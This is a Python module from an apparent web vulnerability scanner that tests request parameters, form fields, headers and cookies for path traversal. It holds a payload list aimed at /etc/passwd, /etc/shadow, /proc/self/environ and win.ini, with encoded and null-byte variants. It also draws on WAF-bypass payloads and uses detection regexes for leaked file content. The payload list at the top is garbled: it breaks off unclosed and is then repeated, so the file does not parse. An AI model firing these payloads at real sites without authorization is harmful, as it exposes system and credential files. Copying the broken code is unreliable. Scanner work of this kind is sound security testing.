"""
Path Traversal scanner module.

Detects directory traversal vulnerabilities that allow attackers
to access files outside the web root directory.
"""
from __future__ import annotations

import re
from typing import Any, Dict, List, Optional

import requests
from scanner.utils.request_metadata import (
    build_request_context,
    form_request_parts,
    injectable_locations,
)
from scanner.utils.waf_evasion import (
    PATH_TRAVERSAL_WAF_BYPASS,
    EvasionLevel,
)


# Path traversal payloads for different OS
PATH_PAYLOADS = [
    # Linux/Unix
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    
    # Windows
    "..\\..\\..\\windows\\win.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
    
    # Null byte bypass (older systems)
    "../../../etc/passwd%00",
    
    # Absolute paths
    "/etc/passwd",
    "C:\\windows\\win.ini",
    


# Path traversal payloads for different OS
PATH_PAYLOADS = [
    # Linux/Unix
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    
    # Windows
    "..\\..\\..\\windows\\win.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
    
    # Null byte bypass (older systems)
    "../../../etc/passwd%00",
    
    # Absolute paths
    "/etc/passwd",
    "C:\\windows\\win.ini",
    
    # Common files to test
    "../../../etc/shadow",
    "../../../etc/hosts",
    "../../../proc/self/environ",
]


class PathTraversalScanner:
    """Scanner for path traversal vulnerabilities."""

    def __init__(self, timeout: int = 10, session: Optional[requests.Session] = None,
                 evasion_level: int = EvasionLevel.MEDIUM) -> None:
        self.timeout = timeout
        self._evasion_level = evasion_level
        # Use provided session (authenticated) or create new one
        if session:
            self.session = session
        else:
            self.session = requests.Session()
            self.session.headers.update({"User-Agent": "vuln-scanner/1.0"})

    def scan_url(self, url: str, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test GET parameters for path traversal."""
        findings: List[Dict[str, Any]] = []

        for param_name in params.keys():
            # Only test params that look like file/path parameters
            if self._looks_like_file_param(param_name):
                print(f"Testing {param_name} for path traversal...")
                original_value = str(params.get(param_name, ""))
                
                for payload in PATH_PAYLOADS:
                    vuln = self._test_path_traversal(url, param_name, original_value, params, payload)
                    if vuln:
                        findings.append(vuln)
                        break

        return findings

    def scan_form(self, form_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test form inputs for path traversal."""
        findings: List[Dict[str, Any]] = []

        action = form_data.get("action")
        method = (form_data.get("method") or "GET").upper()
        if not action:
            return findings
        request_parts = form_request_parts(form_data)
        body_fields, header_fields, cookie_fields, extra_headers, extra_cookies, body_format = request_parts
        for location, param_name in injectable_locations(body_fields, header_fields, cookie_fields):
            if self._looks_like_file_param(param_name):
                print(f"Testing form param {param_name} for path traversal...")
                original_value = {"body": body_fields, "header": header_fields, "cookie": cookie_fields}[location].get(param_name, "")
                
                for payload in PATH_PAYLOADS:
                    vuln = self._test_path_traversal(
                        action, param_name, original_value, request_parts, payload,
                        method=method, body_format=body_format, target_location=location
                    )
                    if vuln:
                        findings.append(vuln)
                        break

        return findings

    # ------------------------------------------------------------------
    # Async methods (native aiohttp — used by AsyncScanEngine v3)
    # ------------------------------------------------------------------

    async def scan_url_async(self, url: str, params: Dict[str, Any], http) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for param_name in params.keys():
            if self._looks_like_file_param(param_name):
                found = False
                for payload in PATH_PAYLOADS:
                    vuln = await self._test_path_async(url, param_name, params, payload, http)
                    if vuln:
                        findings.append(vuln)
                        found = True
                        break
                # WAF evasion fallback
                if not found and self._evasion_level >= EvasionLevel.LOW:
                    limit = {1: 6, 2: 12, 3: 20, 4: len(PATH_TRAVERSAL_WAF_BYPASS)}.get(self._evasion_level, 12)
                    for waf_payload, technique in PATH_TRAVERSAL_WAF_BYPASS[:limit]:
                        vuln = await self._test_path_async(url, param_name, params, waf_payload, http)
                        if vuln:
                            vuln["evidence"] = "[waf-bypass:" + technique + "] " + vuln.get("evidence", "")
                            vuln["confidence"] = min(vuln.get("confidence", 80), 82)
                            findings.append(vuln)
                            break
        return findings

    async def scan_form_async(self, form: Dict[str, Any], http) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        action = form.get("action")
        method = (form.get("method") or "GET").upper()
        if not action:
            return findings
        request_parts = form_request_parts(form)
        body_fields, header_fields, cookie_fields, extra_headers, extra_cookies, body_format = request_parts
        for location, param_name in injectable_locations(body_fields, header_fields, cookie_fields):
            if self._looks_like_file_param(param_name):
                found = False
                for payload in PATH_PAYLOADS:
                    vuln = await self._test_path_async(
                        action, param_name, request_parts, payload, http,
                        method=method, body_format=body_format, target_location=location
                    )
                    if vuln:
                        findings.append(vuln)
                        found = True
                        break
                if not found and self._evasion_level >= EvasionLevel.LOW:
                    limit = {1: 6, 2: 12, 3: 20, 4: len(PATH_TRAVERSAL_WAF_BYPASS)}.get(self._evasion_level, 12)
                    for waf_payload, technique in PATH_TRAVERSAL_WAF_BYPASS[:limit]:
                        vuln = await self._test_path_async(
                            action, param_name, request_parts, waf_payload, http,
                            method=method, body_format=body_format, target_location=location
                        )
                        if vuln:
                            vuln["evidence"] = "[waf-bypass:" + technique + "] " + vuln.get("evidence", "")
                            findings.append(vuln)
                            break
        return findings

    async def _test_path_async(self, test_url, param_name, request_parts, payload, http, method="GET", body_format="form", target_location="body"):
        try:
            body_fields, header_fields, cookie_fields, extra_headers, extra_cookies, _ = request_parts
            data, headers, cookies = build_request_context(
                body_fields, header_fields, cookie_fields, extra_headers, extra_cookies,
                target_location, param_name, payload
            )
            resp = await self._send_async(http, test_url, method, data, headers, cookies, body_format)
            if not resp:
                return None
            text = resp.text or ""
            patterns = [
                (r"root:.*:/bin/(ba)?sh", "/etc/passwd file content"),
                (r"\[extensions\]|for 16-bit app support", "win.ini file content"),
                (r"127\.0\.0\.1\s+localhost", "/etc/hosts file content"),
                (r"nobody:.*:99:99", "/etc/shadow file content"),
            ]
            for pattern, description in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    return {
                        "vulnerable": True,
                        "type": "path-traversal",
                        "param": param_name,
                        "payload": payload,
                        "evidence": f"Detected {description}",
                        "confidence": 95,
                    }
        except Exception:
            pass
        return None

    # ------------------------------------------------------------------
    # Sync internals
    # ------------------------------------------------------------------

    def _looks_like_file_param(self, param_name: str) -> bool:
        """Check if parameter name suggests it handles files/paths."""
        file_keywords = ['file', 'path', 'dir', 'folder', 'document', 'doc', 'page', 'include', 'template', 'view']
        param_lower = param_name.lower()
        return any(keyword in param_lower for keyword in file_keywords)

    def _test_path_traversal(
        self,
        test_url: str,
        param_name: str,
        original_value: str,
        request_parts,
        payload: str,
        method: str = "GET",
        body_format: str = "form",
        target_location: str = "body",
    ) -> Optional[Dict[str, Any]]:
        """Test a single path traversal payload."""
        try:
            injected = payload  # Replace value entirely for path traversal
            body_fields, header_fields, cookie_fields, extra_headers, extra_cookies, _ = request_parts
            data, headers, cookies = build_request_context(
                body_fields, header_fields, cookie_fields, extra_headers, extra_cookies,
                target_location, param_name, injected
            )

            resp = self._send_sync(test_url, method, data, headers, cookies, body_format)

            text = resp.text or ""
            
            # Check for sensitive file content patterns
            patterns = [
                (r"root:.*:/bin/(ba)?sh", "/etc/passwd file content"),
                (r"\[extensions\]|for 16-bit app support", "win.ini file content"),
                (r"127\.0\.0\.1\s+localhost", "/etc/hosts file content"),
                (r"nobody:.*:99:99", "/etc/shadow file content"),
            ]
            
            for pattern, description in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    print(f"Path traversal detected on {param_name} - {description}")
                    return {
                        "vulnerable": True,
                        "type": "path-traversal",
                        "param": param_name,
                        "payload": payload,
                        "evidence": f"Detected {description}",
                        "confidence": 95,
                    }

        except requests.RequestException as exc:
            print(f"Request failed during path traversal test for {param_name}: {exc}")

        return None

    def _form_body_format(self, form: Dict[str, Any]) -> str:
        if form.get("body_format") == "json":
            return "json"
        content_type = str(form.get("content_type", "")).lower()
        if "application/json" in content_type:
            return "json"
        return "form"

    def _send_sync(self, url: str, method: str, data: Dict[str, Any], headers: Dict[str, str], cookies: Dict[str, str], body_format: str):
        if method.upper() == "GET":
            return self.session.get(url, params=data, headers=headers or None, cookies=cookies or None, timeout=self.timeout)
        if body_format == "json":
            return self.session.request(
                method.upper(),
                url,
                json=data,
                timeout=self.timeout,
                headers={**(headers or {}), "Content-Type": "application/json"},
                cookies=cookies or None,
            )
        return self.session.request(method.upper(), url, data=data, headers=headers or None, cookies=cookies or None, timeout=self.timeout)

    async def _send_async(self, http, url: str, method: str, data: Dict[str, Any], headers: Dict[str, str], cookies: Dict[str, str], body_format: str):
        if method.upper() == "GET":
            return await http.get(url, params=data, headers=headers or None, cookies=cookies or None)
        if body_format == "json":
            return await http.request(
                method.upper(),
                url,
                json=data,
                headers={**(headers or {}), "Content-Type": "application/json"},
                cookies=cookies or None,
            )
        return await http.request(method.upper(), url, data=data, headers=headers or None, cookies=cookies or None)
